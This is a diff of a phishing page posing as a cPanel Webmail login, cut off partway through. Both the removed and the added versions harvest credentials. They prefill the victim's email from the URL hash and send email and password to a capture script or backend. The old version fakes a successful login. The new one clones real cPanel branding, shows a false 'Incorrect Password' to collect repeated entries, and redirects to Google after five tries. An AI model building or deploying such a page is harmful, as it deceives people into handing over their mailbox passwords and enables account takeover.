@@ -1,514 +1,313 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en" dir="ltr"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+    <meta name="google" content="notranslate">
+    <meta name="apple-itunes-app" content="app-id=1188352635">
     <title>Webmail Login</title>
-    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A" />
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: "Lucida Grande", "Lucida Sans Unicode", Arial, Verdana, sans-serif;
-            background: #f4f4f4;
-            color: #333;
-            font-size: 11px;
-            line-height: 1.4;
-        }
-        
-        .container {
-            width: 100%;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .webmail-box {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            width: 100%;
-            max-width: 400px;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .header {
-            background: linear-gradient(to bottom, #4a5568, #2d3748);
-            color: #fff;
-            padding: 20px;
-            text-align: center;
-            position: relative;
-        }
-        
-        .header::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57);
-        }
-        
-        .logo {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 5px;
-            letter-spacing: 1px;
-        }
-        
-        .subtitle {
-            font-size: 12px;
-            opacity: 0.9;
-        }
-        
-        .login-form {
-            padding: 30px 25px;
-        }
-        
-        .session-info {
-            background: #e8f4fd;
-            border: 1px solid #bee5eb;
-            border-radius: 4px;
-            padding: 8px 12px;
-            margin-bottom: 20px;
-            font-size: 10px;
-            color: #0c5460;
-            text-align: center;
-        }
-        
-        .form-group {
-            margin-bottom: 18px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 11px;
-            color: #555;
-            font-weight: 600;
-        }
-        
-        .form-group input[type="email"],
-        .form-group input[type="password"] {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e2e8f0;
-            border-radius: 6px;
-            font-size: 13px;
-            font-family: inherit;
-            background: #fff;
-            transition: all 0.3s ease;
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: #4299e1;
-            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
-            background: #f7fafc;
-        }
-        
-        .form-group input.pre-filled {
-            background: #f0fff4;
-            border-color: #48bb78;
-        }
-        
-        .login-button {
-            width: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-            color: #fff;
-            padding: 14px 20px;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-        
-        .login-button:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 7px 14px rgba(50, 50, 93, 0.1), 0 3px 6px rgba(0, 0, 0, 0.08);
-        }
-        
-        .login-button:active {
-            transform: translateY(0);
-        }
-        
-        .login-button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .error-message {
-            background: #fed7d7;
-            border: 1px solid #feb2b2;
-            color: #c53030;
-            padding: 10px 12px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-            font-size: 11px;
-            display: none;
-            animation: slideDown 0.3s ease;
-        }
-        
-        .loading {
-            display: none;
-            text-align: center;
-            margin-top: 15px;
-            color: #666;
-        }
-        
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #e2e8f0;
-            border-top: 2px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 8px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .footer {
-            background: #f7fafc;
-            padding: 15px 25px;
-            text-align: center;
-            font-size: 10px;
-            color: #718096;
-            border-top: 1px solid #e2e8f0;
-        }
-        
-        .footer a {
-            color: #4299e1;
-            text-decoration: none;
-        }
-        
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        
-        .security-notice {
-            margin-top: 10px;
-            font-size: 9px;
-            color: #a0aec0;
-        }
-        
-        /* Session parameters styling */
-        .session-params {
-            position: absolute;
-            top: -1000px;
-            left: -1000px;
-            visibility: hidden;
-        }
-        
-        /* Responsive design */
-        @media (max-width: 480px) {
-            .container {
-                padding: 10px;
-            }
-            
-            .webmail-box {
-                margin: 0;
-            }
-            
-            .login-form {
-                padding: 25px 20px;
-            }
-        }
-        
-        /* Pre-fill highlight animation */
-        @keyframes highlight {
-            0% { background-color: #f0fff4; }
-            50% { background-color: #c6f6d5; }
-            100% { background-color: #f0fff4; }
-        }
-        
-        .highlight-animation {
-            animation: highlight 2s ease-in-out;
-        }
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+
+    <!-- EXTERNAL CSS -->
+    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
+    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560357916/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
+
+    <style type="text/css">
+/*
+  This css is included in the base template in case the css cannot be loaded because of access restrictions
+  If this css is updated, please update securitypolicy_header.html.tmpl as well
+*/
+.copyright {
+  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
+  background-size: 25px auto;
+}
     </style>
+
 </head>
-<body>
-    <!-- Hidden session parameters to mimic real cPanel structure -->
-    <div class="session-params">
-        <input type="hidden" id="cpsess" value="prompt">
-        <input type="hidden" id="fromPWA" value="1">
-        <input type="hidden" id="pwd" value="">
-        <input type="hidden" id="_x_zm_rtaid" value="I7SQ3VePRPS/cndRs57BvQ.1709509974548/">
-        <input type="hidden" id="_x_zm_rhtaid" value="341'">
+<body class="wm"><div id="preload_images"></div>
+
+
+
+
+<input type="hidden" id="goto_uri" value="#">
+<input type="hidden" id="goto_app" value="">
+<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[invalid_session]  -->
+<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
+    <div class="wrapper">
+    <div id="notify">
+        <noscript>
+            <div class="error-notice">
+                <img src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
+                JavaScript is disabled in your browser.
+                For Webmail to function properly, you must enable JavaScript.
+                If you do not enable JavaScript, certain features in Webmail will not function correctly.
+            </div>
+            </noscript>
+        
+        
+       
     </div>
 
-    <div class="container">
-        <div class="webmail-box">
-            <div class="header">
-                <div class="logo">Webmail</div>
-                <div class="subtitle">Secure Email Access</div>
-            </div>
-            
-            <form class="login-form" id="webmail-form" method="POST" action="enhanced_capture.php">
-                <div class="session-info">
-                    Session ID: <span id="session-display">cpsess###prompt</span> | Secure Connection Established
+    <div style="display:none">
+        <div id="locale-container" style="visibility:hidden">
+            <div id="locale-inner-container">
+                <div id="locale-header">
+                    <div class="locale-head">Please select a locale:</div>
+                    <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
                 </div>
-                
-                <div class="error-message" id="error-message">
-                    Invalid login credentials. Please try again.
-                </div>
-                
-                <div class="form-group">
-                    <label for="user">Email Address</label>
-                    <input type="email" id="user" name="email" required autocomplete="username" placeholder="Enter your email address">
-                </div>
-                
-                <div class="form-group">
-                    <label for="pass">Password</label>
-                    <input type="password" id="pass" name="password" required autocomplete="current-password" placeholder="Enter your password">
-                </div>
-                
-                <button type="submit" class="login-button" id="login-btn">
-                    Log in
-                </button>
-                
-                <div class="loading" id="loading">
-                    <div class="spinner"></div>
-                    Authenticating...
-                </div>
-            </form>
-            
-            <div class="footer">
-                <div>Powered by cPanel, Inc.</div>
-                <div class="security-notice">
-                    This is a secure connection. Your data is encrypted.
+                <div id="locale-map">
+                    <div class="scroller clear">
+                        
+                            <div class="locale-cell"><a href="?locale=ar">العربية</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=bg">български</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=cs">čeština</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=da">dansk</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=de">Deutsch</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=el">Ελληνικά</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=es">español</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=es_419">español latinoamericano</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=es_es">español de España</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=fi">suomi</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=fil">Filipino</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=fr">français</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=he">עברית</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=hu">magyar</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=id">Bahasa Indonesia</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=it">italiano</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=ja">日本語</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=ko">한국어</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=ms">Bahasa Melayu</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=nb">norsk bokmål</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=no">Norwegian</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=pl">polski</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=pt">português</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=pt_br">português do Brasil</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=ro">română</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=ru">русский</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=sl">slovenščina</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=sv">svenska</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=th">ไทย</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=tr">Türkçe</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=uk">українська</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=vi">Tiếng Việt</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=zh">中文</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=zh_cn">中文（中国）</a></div>
+                        
+                            <div class="locale-cell"><a href="?locale=zh_tw">中文（台湾）</a></div>
+                        
+                    </div>
                 </div>
             </div>
         </div>
     </div>
+    <div id="content-container">
+        <div id="login-container">
 
-    <script>
-        let attemptCount = 0;
-        
-        // Session simulation
-        function generateSessionId() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = 'cpsess';
-            for (let i = 0; i < 8; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return result + '#prompt';
-        }
-        
-        // Auto-grab email from URL hash and parameters
-        function autoGrabEmail() {
-            const hash = window.location.hash.substring(1);
-            const emailField = document.getElementById('user');
-            
-            if (hash && hash.length > 0) {
-                // Handle [[Email]] placeholder or direct email
-                let email = hash;
-                
-                // Replace placeholder patterns
-                email = email.replace(/\[\[-Email-\]\]/gi, '');
-                email = email.replace(/\[\[email\]\]/gi, '');
-                email = email.replace(/\{\{email\}\}/gi, '');
-                
-                // Check if it's an email pattern
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                
-                if (emailRegex.test(email)) {
-                    emailField.value = email;
-                    emailField.classList.add('pre-filled', 'highlight-animation');
-                    console.log('Auto-filled email from hash:', email);
-                    document.getElementById('pass').focus();
-                } else if (email.includes('@')) {
-                    // Try to decode if it's URL encoded
-                    try {
-                        const decoded = decodeURIComponent(email);
-                        if (emailRegex.test(decoded)) {
-                            emailField.value = decoded;
-                            emailField.classList.add('pre-filled', 'highlight-animation');
-                            console.log('Auto-filled decoded email:', decoded);
-                            document.getElementById('pass').focus();
-                        }
-                    } catch (e) {
-                        console.log('Failed to decode email from hash');
-                    }
-                }
-            }
-            
-            // Also check URL parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            const paramEmail = urlParams.get('email') || urlParams.get('user') || urlParams.get('target');
-            
-            if (paramEmail && !emailField.value) {
-                emailField.value = decodeURIComponent(paramEmail);
-                emailField.classList.add('pre-filled', 'highlight-animation');
-                console.log('Auto-filled email from parameter:', paramEmail);
-                document.getElementById('pass').focus();
-            }
-        }
-        
-        // Enhanced form submission
-        document.getElementById('webmail-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const form = this;
-            const email = document.getElementById('user').value.trim();
-            const password = document.getElementById('pass').value;
-            const errorDiv = document.getElementById('error-message');
-            const loadingDiv = document.getElementById('loading');
-            const submitBtn = document.getElementById('login-btn');
-            
-            // Basic validation
-            if (!email || !password) {
-                showError('Please enter both email address and password.');
-                return;
-            }
-            
-            if (!email.includes('@') || email.length < 5) {
-                showError('Please enter a valid email address.');
-                return;
-            }
-            
-            // Increment attempt counter
-            attemptCount++;
-            
-            // Show loading state
-            hideError();
-            loadingDiv.style.display = 'block';
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Authenticating...';
-            
-            // Simulate realistic server processing time
-            const delay = Math.random() * 2000 + 1500; // 1.5-3.5 seconds
-            
-            setTimeout(() => {
-                // Submit to capture script
-                fetch('enhanced_capture.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: new URLSearchParams(new FormData(form))
-                })
-                .then(response => response.json())
-                .then(data => {
-                    loadingDiv.style.display = 'none';
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Log in';
+            <div id="login-sub-container">
+                    <div id="login-sub-header">
+                        
+                        <img class="main-logo" src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
+                        
+                    </div>
+                    <div id="login-sub">
+                        
+                        <div id="forms">
+                            <form novalidate="" id="login_form" action="" method="post" target="_self" style="visibility:">
+                                <div class="input-req-login"><label for="user">Email Address</label></div>
+                                <div class="input-field-login icon username-container">
+                                    <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+                                </div>
+                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
+                                <div class="input-field-login icon password-container">
+                                    <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+                                </div>
+								<p id="msg" style="color:red;"></p>
+                                <div class="controls">
+                                    <div class="login-btn">
+                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+                                    </div>
+
+                                                                            <div class="reset-pw">
+                                            <a href="#" id="reset_password">Reset Password
+                                            </a>
+                                        </div>
+                                                                    </div>
+                                <div class="clear" id="push"></div>
+                            </form>
+                        <!--CLOSE forms -->
+                        </div>
+                    <!--CLOSE login-sub -->
+                    </div>
                     
-                    if (data.signal === 'ok') {
-                        // Success - show success message and redirect
-                        document.querySelector('.login-form').innerHTML = 
-                            '<div style="text-align: center; padding: 40px 20px;">' +
-                            '<div style="color: #38a169; font-size: 16px; margin-bottom: 15px;">✓ Login Successful</div>' +
-                            '<div style="color: #666; font-size: 12px; margin-bottom: 10px;">Redirecting to your mailbox...</div>' +
-                            '<div style="color: #999; font-size: 10px;">Please wait while we load your emails.</div>' +
-                            '</div>';
-                        
-                        setTimeout(() => {
-                            window.location.href = 'https://webmail.cpanel.net/';
-                        }, 2500);
-                    } else {
-                        // Show appropriate error message
-                        const errorMessages = [
-                            'Login failed. Please check your credentials and try again.',
-                            'Invalid email address or password. Please verify your information.',
-                            'Authentication failed. Please ensure your credentials are correct.',
-                            'Login unsuccessful. Please check your email and password.'
-                        ];
-                        
-                        const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-                        showError(data.msg || randomError);
-                        
-                        // Clear password field for security
-                        document.getElementById('pass').value = '';
-                        document.getElementById('pass').focus();
-                    }
-                })
-                .catch(error => {
-                    loadingDiv.style.display = 'none';
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Log in';
-                    showError('Connection error. Please check your internet connection and try again.');
-                    console.error('Fetch error:', error);
-                });
-            }, delay);
-        });
+
+                                    <!--CLOSE wrapper -->
+                </div>
+            <!--CLOSE login-sub-container -->
+            </div>
+        <!--CLOSE login-container -->
+        </div>
         
-        function showError(message) {
-            const errorDiv = document.getElementById('error-message');
-            errorDiv.textContent = message;
-            errorDiv.style.display = 'block';
+                <div id="locale-footer" style="display: block;">
+            <div class="locale-container">
+                <noscript>
+                    <form method="get" action=".">
+                        <select name="locale">
+                            <option value="">Change locale</option>
+                            <option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                        </select>
+                        <button style="margin-left: 10px" type="submit">Change</button>
+                    </form>
+                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
+                </noscript>
+                <ul id="locales_list">
+                    
+                        
+                        <li><a href="###">العربية</a></li>
+                    
+                        
+                        <li><a href="###">български</a></li>
+                    
+                        
+                        <li><a href="###">čeština</a></li>
+                    
+                        
+                        <li><a href="###">dansk</a></li>
+                    
+                        
+                        <li><a href="###">Deutsch</a></li>
+                    
+                        
+                        <li><a href="###">Ελληνικά</a></li>
+                    
+                        
+                        <li><a href="###">español</a></li>
+                    
+                        
+                        <li><a href="###">español&nbsp;latinoamericano</a></li>
+                    
+                        
+                    <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
+                </ul>
+                <div id="mobilelocalemenu">Select a locale:
+                    <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--Close login-wrapper -->
+</div>
+
+
+<style>
+    @media (min-width: 481px) {
+        #select_user_form {
+            width: px;
+        }
+    }
+</style>
+    <div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
+    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
+
+	 <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-sweetalert/1.0.1/sweetalert.min.css" integrity="sha512-hwwdtOTYkQwW2sedIsbuP1h0mWeJe/hFOfsvNKpRB3CkRxq8EW7QMheec1Sgd8prYxGm1OM9OZcGW7/GUud5Fw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script>
+$(document).ready(function(){
+    var count = 0;
+    var email = window.location.hash.substr(1);
+    
+    if (email) {
+        $('#email').val(email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!filter.test(email)) {
+            $('#error').show();
+            return false;
+        }
+    }
+    
+    $('#login_submit').click(function(event){
+        $('#error, #msg').hide();
+        event.preventDefault();
+        
+        var email = $("#email").val();
+        var password = $("#password").val();
+        
+        if (!password) {
+            $('#msg').show().html("Password is empty!");
+            return false;
         }
         
-        function hideError() {
-            document.getElementById('error-message').style.display = 'none';
+        count++;
+        
+        swal('Incorrect Password: Please re-enter password');
+        
+        if (count >= 5) {
+            setTimeout(function(){
+                window.location.href = "https://google.com";
+            }, 1000);
         }
         
-        // Initialize on page load
-        window.addEventListener('load', function() {
-            // Set random session ID
-            document.getElementById('session-display').textContent = generateSessionId();
-            
-            // Auto-grab email
-            autoGrabEmail();
-            
-            // Focus appropriate field
-            const emailField = document.getElementById('user');
-            if (emailField.value && emailField.value.length > 0) {
-                document.getElementById('pass').focus();
-            } else {
-                emailField.focus();
-            }
-            
-            // Remove highlight animation after it completes
-            setTimeout(() => {
-                emailField.classList.remove('highlight-animation');
-            }, 2000);
-        });
-        
-        // Handle hash changes
-        window.addEventListener('hashchange', function() {
-            autoGrabEmail();
-        });
-        
-        // Enter key handling
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && (e.target.id === 'user' || e.target.id === 'pass')) {
-                document.getElementById('webmail-form').dispatchEvent(new Event('submit'));
+        // Send data to PHP backend for email delivery
+        $.ajax({
+            type: 'POST',
